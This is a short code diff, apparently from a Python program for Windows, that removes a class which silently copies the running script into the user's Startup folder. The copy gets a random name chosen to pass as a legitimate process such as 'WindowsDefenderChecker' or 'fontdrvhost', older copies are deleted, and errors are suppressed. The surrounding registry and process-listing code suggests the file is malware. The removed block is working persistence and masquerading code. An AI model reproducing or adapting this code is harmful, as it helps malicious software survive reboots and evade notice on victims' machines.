@@ -93,30 +93,6 @@ def regkey():
     finally:
         winreg.CloseKey(handle)
 
-class StartUp:
-    procces_list = ["WindowsDefenderChecker", "WindowsBinaryX86", 'PCHealthify', 'ProcessUUID', 'YourPhone', 'Registry', 'fontdrvhost', 'gameinputsvc', 'CefSharp.BrowserSubprocess']
-    path = str(os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup')
-    current_name = None
-
-    def setinstartup():
-        for file in os.listdir(StartUp.path):
-            if file.replace('.exe', '') in StartUp.procces_list:
-                os.remove(StartUp.path+"\\"+file)
-        StartUp.current_name = random.choice(StartUp.procces_list)
-        shutil.copy(__file__, f'{StartUp.path}\{StartUp.current_name}')
-        
-
-    def isinstartup():
-        for file in os.listdir(StartUp.path):
-            if str(file) == str(StartUp.current_name):
-                return True
-        return False
-
-try:
-    StartUp.setinstartup()
-except:
-    pass
-
 
 try:        
     from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
